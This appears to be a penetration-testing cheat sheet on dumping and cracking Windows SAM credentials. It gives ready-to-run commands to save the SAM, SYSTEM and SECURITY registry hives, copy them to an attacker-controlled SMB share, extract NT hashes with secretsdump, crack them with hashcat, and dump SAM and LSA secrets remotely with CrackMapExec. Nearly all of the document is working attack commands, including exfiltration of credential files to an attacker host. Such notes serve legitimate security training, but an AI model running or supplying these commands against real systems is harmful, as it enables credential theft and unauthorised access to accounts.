


# Attacking SAM

[See Windows credentials storage](windows-credentials-storage.md).

## Dumping SAM Locally

### 1. Copying SAM Registry Hives

There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. 

|Registry Hive|Description|
|---|---|
|`hklm\sam`|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|`hklm\system`|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|`hklm\security`|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|


Launching CMD as an admin will allow us to run reg.exe to save copies of the registry hives.

```cmd-session
reg.exe save hklm\sam C:\sam.sav

reg.exe save hklm\system C:\system.save

reg.exe save hklm\security C:\security.save
```

Transfer the registry hives to our attacker machine, for instance, with [smbserver.py from impacket](smbserver.md).

```bash
# From the attacker machine (our kali) all we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the direct
#########################################
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

# From the victim's machine (windows)
#########################################
move sam.save \\$ipAttacker\CompData
move system.save \\$ipAttacker\CompData
move security.save \\$ipAttacker\CompData
```


### 2. Dumping Hashes with Impacket's secretsdump.py

```bash
locate secretsdump 
```

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Secretsdump dumps the local SAM hashes and would've 
also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. 

The first step secretsdump executes is targeting the system bootkey before proceeding to dump the LOCAL SAM hashes. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database.

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
(uid:rid:lmhash:nthash)
```

Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS. Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords.


### 3. Cracking Hashes with Hashcat

[See hashcat](hashcat.md):

```bash
# Adding nthashes to a .txt File
# Copy paste them in hashestocrack.txt

# Hashcat them
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
# -m 1000: select module for NT hashes
```


## Dumping SAM Remotely

### With CrackMapExec

With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. 

[Cheat sheet of CrackMapExec](crackmapexec.md).

```bash
crackmapexec smb $ip --local-auth -u <username> -p <password> --sam

crackmapexec smb $ip --local-auth -u <username> -p <password> --lsa

```